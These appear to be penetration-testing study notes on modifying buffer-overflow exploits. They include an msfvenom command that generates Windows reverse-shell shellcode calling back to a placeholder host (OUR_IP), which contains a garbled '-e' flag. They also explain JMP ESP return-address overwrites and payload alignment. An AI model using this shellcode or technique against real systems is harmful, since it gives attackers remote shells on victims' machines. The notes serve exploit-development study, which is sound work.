# Modifying Exploits

## Generate Shellcode

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=OUR_IP LPORT=OUR_PORT EXITFUNC=thread -f c â€“e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

**Notes:**

- `EXITFUNC=thread` is useful when injecting into a process as without it, closing the shell would end the injected process
- `-b "\x00\x0a\x0d\x25\x26\x2b\x3d"` should always be included when generating C code to avoid potential issues

We can then copy and paste this into our C code before compiling it with [mingw](Tools/mingw.md).

## Fundamentals

We should leave NOP slides, but modify remaining shellcode using the previously mentioned command.

We also might need to modify the return address.

**Key Concept:** Return addresses coded in C are ordered backwards to their respective mapped addresses when debugging. So, a coded return address of:

```c
unsigned char retn[] = "\x83\x0c\x09\x10";
```

Corresponds to the address in a debugger:

```
0x10090c83
```

### Return Addresses

When it comes to buffer overflow, in order to execute shellcode that is present on the stack, we must make our return address point to a `JMP ESP` instruction.

By overwriting a function's return address with the address of a `JMP ESP` instruction found elsewhere in the program or in a loaded library, we can redirect the program's execution directly to the shellcode they've injected into the stack. This is because `JMP ESP` instructs the CPU to jump to the address contained in the `ESP` register, which, in the case of a buffer overflow, can be manipulated to point to our shellcode.

We can discover `JMP ESP`'s in our target program using Immunity Debugger

### Misalignment

In the case our buffer overflow is still failing, the most common issue tends to be from misalignment. This often occurs when constructing the payload, especially due to the null-termination of strings in C. If the payload is intended to precisely overwrite up to the return address but is null-terminated, it may end up one byte short, misaligning the overwrite.

**Solution:** Ensure the buffer size accounts for null-termination. If 780 bytes are needed to reach the return address, allocate 781 bytes and fill with your payload, setting the last byte to `0x00` to maintain string compatibility. This adjustment corrects the misalignment, ensuring the return address is accurately overwritten.

```c
int initial_buffer_size = 781; // Adjust buffer size for null-termination
char *padding = malloc(initial_buffer_size);
memset(padding, 0x41, initial_buffer_size - 1); // Fill buffer, leaving last byte
memset(padding + initial_buffer_size - 1, 0x00, 1); // Set last byte to null
```
